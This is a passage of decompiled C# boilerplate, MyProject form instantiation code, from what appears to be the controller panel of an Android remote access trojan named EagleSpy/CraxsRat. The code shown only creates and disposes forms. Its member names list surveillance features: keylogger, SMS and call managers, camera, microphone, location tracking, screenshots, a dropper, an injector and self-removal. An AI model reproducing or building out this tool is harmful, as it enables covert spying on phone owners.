			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Ports)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Ports>(ref this.m_Ports);
				}
			}
		}

		// Token: 0x1700013C RID: 316
		// (get) Token: 0x060009B3 RID: 2483 RVA: 0x000E0A6C File Offset: 0x000DEC6C
		// (set) Token: 0x060009B4 RID: 2484 RVA: 0x000E0A94 File Offset: 0x000DEC94
		public Report Report
		{
			[DebuggerHidden]
			get
			{
				this.m_Report = MyProject.MyForms.Create__Instance__<Report>(this.m_Report);
				return this.m_Report;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Report)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Report>(ref this.m_Report);
				}
			}
		}

		// Token: 0x1700013D RID: 317
		// (get) Token: 0x060009B5 RID: 2485 RVA: 0x000E0ACC File Offset: 0x000DECCC
		// (set) Token: 0x060009B6 RID: 2486 RVA: 0x000E0AF4 File Offset: 0x000DECF4
		public ScreenLoger ScreenLoger
		{
			[DebuggerHidden]
			get
			{
				this.m_ScreenLoger = MyProject.MyForms.Create__Instance__<ScreenLoger>(this.m_ScreenLoger);
				return this.m_ScreenLoger;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_ScreenLoger)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<ScreenLoger>(ref this.m_ScreenLoger);
				}
			}
		}

		// Token: 0x1700013E RID: 318
		// (get) Token: 0x060009B7 RID: 2487 RVA: 0x000E0B2C File Offset: 0x000DED2C
		// (set) Token: 0x060009B8 RID: 2488 RVA: 0x000E0B54 File Offset: 0x000DED54
		public ScreenReader ScreenReader
		{
			[DebuggerHidden]
			get
			{
				this.m_ScreenReader = MyProject.MyForms.Create__Instance__<ScreenReader>(this.m_ScreenReader);
				return this.m_ScreenReader;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_ScreenReader)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<ScreenReader>(ref this.m_ScreenReader);
				}
			}
		}

		// Token: 0x1700013F RID: 319
		// (get) Token: 0x060009B9 RID: 2489 RVA: 0x000E0B8C File Offset: 0x000DED8C
		// (set) Token: 0x060009BA RID: 2490 RVA: 0x000E0BB4 File Offset: 0x000DEDB4
		public ScreenReaderV2 ScreenReaderV2
		{
			[DebuggerHidden]
			get
			{
				this.m_ScreenReaderV2 = MyProject.MyForms.Create__Instance__<ScreenReaderV2>(this.m_ScreenReaderV2);
				return this.m_ScreenReaderV2;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_ScreenReaderV2)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<ScreenReaderV2>(ref this.m_ScreenReaderV2);
				}
			}
		}

		// Token: 0x17000140 RID: 320
		// (get) Token: 0x060009BB RID: 2491 RVA: 0x000E0BEC File Offset: 0x000DEDEC
		// (set) Token: 0x060009BC RID: 2492 RVA: 0x000E0C14 File Offset: 0x000DEE14
		public ScreenShoter ScreenShoter
		{
			[DebuggerHidden]
			get
			{
				this.m_ScreenShoter = MyProject.MyForms.Create__Instance__<ScreenShoter>(this.m_ScreenShoter);
				return this.m_ScreenShoter;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_ScreenShoter)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<ScreenShoter>(ref this.m_ScreenShoter);
				}
			}
		}

		// Token: 0x17000141 RID: 321
		// (get) Token: 0x060009BD RID: 2493 RVA: 0x000E0C4C File Offset: 0x000DEE4C
		// (set) Token: 0x060009BE RID: 2494 RVA: 0x000E0C74 File Offset: 0x000DEE74
		public SelfRemove SelfRemove
		{
			[DebuggerHidden]
			get
			{
				this.m_SelfRemove = MyProject.MyForms.Create__Instance__<SelfRemove>(this.m_SelfRemove);
				return this.m_SelfRemove;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_SelfRemove)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<SelfRemove>(ref this.m_SelfRemove);
				}
			}
		}

		// Token: 0x17000142 RID: 322
		// (get) Token: 0x060009BF RID: 2495 RVA: 0x000E0CAC File Offset: 0x000DEEAC
		// (set) Token: 0x060009C0 RID: 2496 RVA: 0x000E0CD4 File Offset: 0x000DEED4
		public Settings Settings
		{
			[DebuggerHidden]
			get
			{
				this.m_Settings = MyProject.MyForms.Create__Instance__<Settings>(this.m_Settings);
				return this.m_Settings;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Settings)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Settings>(ref this.m_Settings);
				}
			}
		}

		// Token: 0x17000143 RID: 323
		// (get) Token: 0x060009C1 RID: 2497 RVA: 0x000E0D0C File Offset: 0x000DEF0C
		// (set) Token: 0x060009C2 RID: 2498 RVA: 0x000E0D34 File Offset: 0x000DEF34
		public ShellTerminal ShellTerminal
		{
			[DebuggerHidden]
			get
			{
				this.m_ShellTerminal = MyProject.MyForms.Create__Instance__<ShellTerminal>(this.m_ShellTerminal);
				return this.m_ShellTerminal;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_ShellTerminal)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<ShellTerminal>(ref this.m_ShellTerminal);
				}
			}
		}

		// Token: 0x17000144 RID: 324
		// (get) Token: 0x060009C3 RID: 2499 RVA: 0x000E0D6C File Offset: 0x000DEF6C
		// (set) Token: 0x060009C4 RID: 2500 RVA: 0x000E0D94 File Offset: 0x000DEF94
		public smsMaker smsMaker
		{
			[DebuggerHidden]
			get
			{
				this.m_smsMaker = MyProject.MyForms.Create__Instance__<smsMaker>(this.m_smsMaker);
				return this.m_smsMaker;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_smsMaker)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<smsMaker>(ref this.m_smsMaker);
				}
			}
		}

		// Token: 0x17000145 RID: 325
		// (get) Token: 0x060009C5 RID: 2501 RVA: 0x000E0DCC File Offset: 0x000DEFCC
		// (set) Token: 0x060009C6 RID: 2502 RVA: 0x000E0DF4 File Offset: 0x000DEFF4
		public SMSManager SMSManager
		{
			[DebuggerHidden]
			get
			{
				this.m_SMSManager = MyProject.MyForms.Create__Instance__<SMSManager>(this.m_SMSManager);
				return this.m_SMSManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_SMSManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<SMSManager>(ref this.m_SMSManager);
				}
			}
		}

		// Token: 0x17000146 RID: 326
		// (get) Token: 0x060009C7 RID: 2503 RVA: 0x000E0E2C File Offset: 0x000DF02C
		// (set) Token: 0x060009C8 RID: 2504 RVA: 0x000E0E54 File Offset: 0x000DF054
		public snapsdownloader snapsdownloader
		{
			[DebuggerHidden]
			get
			{
				this.m_snapsdownloader = MyProject.MyForms.Create__Instance__<snapsdownloader>(this.m_snapsdownloader);
				return this.m_snapsdownloader;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_snapsdownloader)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<snapsdownloader>(ref this.m_snapsdownloader);
				}
			}
		}

		// Token: 0x17000147 RID: 327
		// (get) Token: 0x060009C9 RID: 2505 RVA: 0x000E0E8C File Offset: 0x000DF08C
		// (set) Token: 0x060009CA RID: 2506 RVA: 0x000E0EB4 File Offset: 0x000DF0B4
		public Upload Upload
		{
			[DebuggerHidden]
			get
			{
				this.m_Upload = MyProject.MyForms.Create__Instance__<Upload>(this.m_Upload);
				return this.m_Upload;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Upload)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Upload>(ref this.m_Upload);
				}
			}
		}

		// Token: 0x17000148 RID: 328
		// (get) Token: 0x060009CB RID: 2507 RVA: 0x000E0EEC File Offset: 0x000DF0EC
		// (set) Token: 0x060009CC RID: 2508 RVA: 0x000E0F14 File Offset: 0x000DF114
		public WebViewMonitor WebViewMonitor
		{
			[DebuggerHidden]
			get
			{
				this.m_WebViewMonitor = MyProject.MyForms.Create__Instance__<WebViewMonitor>(this.m_WebViewMonitor);
				return this.m_WebViewMonitor;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_WebViewMonitor)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<WebViewMonitor>(ref this.m_WebViewMonitor);
				}
			}
		}

		// Token: 0x17000149 RID: 329
		// (get) Token: 0x060009CD RID: 2509 RVA: 0x000E0F4C File Offset: 0x000DF14C
		// (set) Token: 0x060009CE RID: 2510 RVA: 0x000E0F74 File Offset: 0x000DF174
		public Win_Users Win_Users
		{
			[DebuggerHidden]
			get
			{
				this.m_Win_Users = MyProject.MyForms.Create__Instance__<Win_Users>(this.m_Win_Users);
				return this.m_Win_Users;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Win_Users)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Win_Users>(ref this.m_Win_Users);
				}
			}
		}

		// Token: 0x060009CF RID: 2511 RVA: 0x000E0FAC File Offset: 0x000DF1AC
		[DebuggerHidden]
		private static T Create__Instance__<T>(T Instance) where T : Form, new()
		{
			T result;
			if (Instance != null && !Instance.IsDisposed)
			{
				result = Instance;
			}
			else
			{
				if (MyProject.MyForms.m_FormBeingCreated != null)
				{
					if (MyProject.MyForms.m_FormBeingCreated.ContainsKey(typeof(!!0)))
					{
						throw new InvalidOperationException(Utils.GetResourceString("WinForms_RecursiveFormCreate", Array.Empty<string>()));
					}
				}
				else
				{
					MyProject.MyForms.m_FormBeingCreated = new Hashtable();
				}
				MyProject.MyForms.m_FormBeingCreated.Add(typeof(!!0), null);
				object obj;
				TargetInvocationException ex3;
				bool flag;
				TargetInvocationException ex2;
				try
				{
					result = Activator.CreateInstance<T>();
				}
				catch when (delegate
				{
					// Failed to create a 'catch-when' expression
					ex3 = (obj as TargetInvocationException);
					if (ex3 == null)
					{
						flag = false;
					}
					else
					{
						ex2 = ex3;
						TargetInvocationException ex = ex2;
						flag = (delegate
						{
							ProjectData.SetProjectError(ex);
							return ex.InnerException != null;
						}() > false);
					}
					endfilter(flag);
				})
				{
					string resourceString = Utils.GetResourceString("WinForms_SeeInnerException", new string[]
					{
						CS$<>8__locals1.ex.InnerException.Message
					});
					throw new InvalidOperationException(resourceString, CS$<>8__locals1.ex.InnerException);
				}
				finally
				{
					MyProject.MyForms.m_FormBeingCreated.Remove(typeof(!!0));
				}
			}
			return result;
		}

		// Token: 0x060009D0 RID: 2512 RVA: 0x00003D4E File Offset: 0x00001F4E
		[DebuggerHidden]
		private void Dispose__Instance__<T>(ref T instance) where T : Form
		{
			instance.Dispose();
			instance = default(!!0);
		}

		// Token: 0x060009D1 RID: 2513 RVA: 0x00002085 File Offset: 0x00000285
		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public MyForms()
		{
		}

		// Token: 0x060009D2 RID: 2514 RVA: 0x000E10DC File Offset: 0x000DF2DC
		[EditorBrowsable(EditorBrowsableState.Never)]
		public override bool Equals(object o)
		{
			return base.Equals(RuntimeHelpers.GetObjectValue(o));
		}

		// Token: 0x060009D3 RID: 2515 RVA: 0x000E10F8 File Offset: 0x000DF2F8
		[EditorBrowsable(EditorBrowsableState.Never)]
		public override int GetHashCode()
		{
			return base.GetHashCode();
		}

		// Token: 0x060009D4 RID: 2516 RVA: 0x000E1110 File Offset: 0x000DF310
		[EditorBrowsable(EditorBrowsableState.Never)]
		internal new Type GetType()
		{
			return typeof(MyProject.MyForms);
		}

		// Token: 0x060009D5 RID: 2517 RVA: 0x000E112C File Offset: 0x000DF32C
		[EditorBrowsable(EditorBrowsableState.Never)]
		public override string ToString()
		{
			return base.ToString();
		}

		// Token: 0x04000FFD RID: 4093
		[ThreadStatic]
		private static Hashtable m_FormBeingCreated;

		// Token: 0x04000FFE RID: 4094
		[EditorBrowsable(EditorBrowsableState.Never)]
		public AccountManager m_AccountManager;

		// Token: 0x04000FFF RID: 4095
		[EditorBrowsable(EditorBrowsableState.Never)]
		public AddNumber m_AddNumber;

		// Token: 0x04001000 RID: 4096
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Apk_studio m_Apk_studio;

		// Token: 0x04001001 RID: 4097
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Apkinstaller m_Apkinstaller;

		// Token: 0x04001002 RID: 4098
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Applications m_Applications;

		// Token: 0x04001003 RID: 4099
		[EditorBrowsable(EditorBrowsableState.Never)]
		public AppsProperties m_AppsProperties;

		// Token: 0x04001004 RID: 4100
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Auto_Clicker m_Auto_Clicker;

		// Token: 0x04001005 RID: 4101
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Build m_Build;

		// Token: 0x04001006 RID: 4102
		[EditorBrowsable(EditorBrowsableState.Never)]
		public CallPhone m_CallPhone;

		// Token: 0x04001007 RID: 4103
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Calls_Records m_Calls_Records;

		// Token: 0x04001008 RID: 4104
		[EditorBrowsable(EditorBrowsableState.Never)]
		public CallsManager m_CallsManager;

		// Token: 0x04001009 RID: 4105
		[EditorBrowsable(EditorBrowsableState.Never)]
		public CameraManager m_CameraManager;

		// Token: 0x0400100A RID: 4106
		[EditorBrowsable(EditorBrowsableState.Never)]
		public ClipboardManager m_ClipboardManager;

		// Token: 0x0400100B RID: 4107
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Color_Box0 m_Color_Box0;

		// Token: 0x0400100C RID: 4108
		[EditorBrowsable(EditorBrowsableState.Never)]
		public comptableform m_comptableform;

		// Token: 0x0400100D RID: 4109
		[EditorBrowsable(EditorBrowsableState.Never)]
		public ContactsManager m_ContactsManager;

		// Token: 0x0400100E RID: 4110
		[EditorBrowsable(EditorBrowsableState.Never)]
		public EagleSpyCallLogs m_craxscallslog;

		// Token: 0x0400100F RID: 4111
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Eaglepopup m_Craxspopup;

		// Token: 0x04001010 RID: 4112
		[EditorBrowsable(EditorBrowsableState.Never)]
		public EagleSpyMain m_CraxsRatMain;

		// Token: 0x04001011 RID: 4113
		[EditorBrowsable(EditorBrowsableState.Never)]
		public EagleSpySettinngs m_CraxsSettings;

		// Token: 0x04001012 RID: 4114
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Dialog1 m_Dialog1;

		// Token: 0x04001013 RID: 4115
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Dialog2 m_Dialog2;

		// Token: 0x04001014 RID: 4116
		[EditorBrowsable(EditorBrowsableState.Never)]
		public DialogPloice m_DialogPloice;

		// Token: 0x04001015 RID: 4117
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Download m_Download;

		// Token: 0x04001016 RID: 4118
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Drooper m_Drooper;

		// Token: 0x04001017 RID: 4119
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Editor m_Editor;

		// Token: 0x04001018 RID: 4120
		[EditorBrowsable(EditorBrowsableState.Never)]
		public EditSocket m_EditSocket;

		// Token: 0x04001019 RID: 4121
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Faker m_Faker;

		// Token: 0x0400101A RID: 4122
		[EditorBrowsable(EditorBrowsableState.Never)]
		public FileManager m_FileManager;

		// Token: 0x0400101B RID: 4123
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Icons m_Icons;

		// Token: 0x0400101C RID: 4124
		[EditorBrowsable(EditorBrowsableState.Never)]
		public information m_information;

		// Token: 0x0400101D RID: 4125
		[EditorBrowsable(EditorBrowsableState.Never)]
		public inp m_inp;

		// Token: 0x0400101E RID: 4126
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Jector m_Jector;

		// Token: 0x0400101F RID: 4127
		[EditorBrowsable(EditorBrowsableState.Never)]
		public KeyboardManager m_KeyboardManager;

		// Token: 0x04001020 RID: 4128
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Keylogger m_Keylogger;

		// Token: 0x04001021 RID: 4129
		[EditorBrowsable(EditorBrowsableState.Never)]
		public LanguageSelector m_LanguageSelector;

		// Token: 0x04001022 RID: 4130
		[EditorBrowsable(EditorBrowsableState.Never)]
		public LocationManager m_LocationManager;

		// Token: 0x04001023 RID: 4131
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Microphone m_Microphone;

		// Token: 0x04001024 RID: 4132
		[EditorBrowsable(EditorBrowsableState.Never)]
		public nonetform m_nonetform;

		// Token: 0x04001025 RID: 4133
		[EditorBrowsable(EditorBrowsableState.Never)]
		public PermissionsManager m_PermissionsManager;

		// Token: 0x04001026 RID: 4134
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Ports m_Ports;

		// Token: 0x04001027 RID: 4135
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Report m_Report;

		// Token: 0x04001028 RID: 4136
		[EditorBrowsable(EditorBrowsableState.Never)]
		public ScreenLoger m_ScreenLoger;

		// Token: 0x04001029 RID: 4137
		[EditorBrowsable(EditorBrowsableState.Never)]
		public ScreenReader m_ScreenReader;

		// Token: 0x0400102A RID: 4138
		[EditorBrowsable(EditorBrowsableState.Never)]
		public ScreenReaderV2 m_ScreenReaderV2;

		// Token: 0x0400102B RID: 4139
		[EditorBrowsable(EditorBrowsableState.Never)]
		public ScreenShoter m_ScreenShoter;

		// Token: 0x0400102C RID: 4140
		[EditorBrowsable(EditorBrowsableState.Never)]
		public SelfRemove m_SelfRemove;

		// Token: 0x0400102D RID: 4141
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Settings m_Settings;

		// Token: 0x0400102E RID: 4142
		[EditorBrowsable(EditorBrowsableState.Never)]
		public ShellTerminal m_ShellTerminal;

		// Token: 0x0400102F RID: 4143
		[EditorBrowsable(EditorBrowsableState.Never)]
		public smsMaker m_smsMaker;

		// Token: 0x04001030 RID: 4144
		[EditorBrowsable(EditorBrowsableState.Never)]
		public SMSManager m_SMSManager;

		// Token: 0x04001031 RID: 4145
		[EditorBrowsable(EditorBrowsableState.Never)]
		public snapsdownloader m_snapsdownloader;

		// Token: 0x04001032 RID: 4146
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Upload m_Upload;

		// Token: 0x04001033 RID: 4147
		[EditorBrowsable(EditorBrowsableState.Never)]
		public WebViewMonitor m_WebViewMonitor;

		// Token: 0x04001034 RID: 4148
		[EditorBrowsable(EditorBrowsableState.Never)]
		public Win_Users m_Win_Users;
	}

	// Token: 0x020000F0 RID: 240
	[EditorBrowsable(EditorBrowsableState.Never)]
	[MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
	internal sealed class MyWebServices
	{
		// Token: 0x060009D8 RID: 2520 RVA: 0x000E10DC File Offset: 0x000DF2DC
		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public override bool Equals(object o)
		{
			return base.Equals(RuntimeHelpers.GetObjectValue(o));
		}

		// Token: 0x060009D9 RID: 2521 RVA: 0x000E10F8 File Offset: 0x000DF2F8
		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public override int GetHashCode()
		{
			return base.GetHashCode();
		}

		// Token: 0x060009DA RID: 2522 RVA: 0x000E116C File Offset: 0x000DF36C
		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		internal new Type GetType()
		{
			return typeof(MyProject.MyWebServices);
		}

		// Token: 0x060009DB RID: 2523 RVA: 0x000E112C File Offset: 0x000DF32C
		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public override string ToString()
		{
			return base.ToString();
		}

		// Token: 0x060009DC RID: 2524 RVA: 0x000E1188 File Offset: 0x000DF388
		[DebuggerHidden]
		private static T Create__Instance__<T>(T instance) where T : new()
		{
			T result;
			if (instance == null)
			{
				result = Activator.CreateInstance<T>();
			}
			else
			{
				result = instance;
			}
			return result;
		}

		// Token: 0x060009DD RID: 2525 RVA: 0x00003D63 File Offset: 0x00001F63
		[DebuggerHidden]
		private void Dispose__Instance__<T>(ref T instance)
		{
			instance = default(!!0);
		}

		// Token: 0x060009DE RID: 2526 RVA: 0x00002085 File Offset: 0x00000285
		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public MyWebServices()
		{
		}
	}

	// Token: 0x020000F1 RID: 241
	[EditorBrowsable(EditorBrowsableState.Never)]
	[ComVisible(false)]
	internal sealed class ThreadSafeObjectProvider<T> where T : new()
	{
		// Token: 0x1700014A RID: 330
		// (get) Token: 0x060009DF RID: 2527 RVA: 0x000E11AC File Offset: 0x000DF3AC
		internal T GetInstance
		{
			[DebuggerHidden]
			get
			{
				if (MyProject.ThreadSafeObjectProvider<!0>.m_ThreadStaticValue == null)
				{
					MyProject.ThreadSafeObjectProvider<!0>.m_ThreadStaticValue = Activator.CreateInstance<T>();
				}
				return MyProject.ThreadSafeObjectProvider<!0>.m_ThreadStaticValue;
			}
		}

		// Token: 0x060009E0 RID: 2528 RVA: 0x00002085 File Offset: 0x00000285
		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public ThreadSafeObjectProvider()
		{
		}

		// Token: 0x04001036 RID: 4150
		[CompilerGenerated]
		[ThreadStatic]
		private static T m_ThreadStaticValue;
	}
}
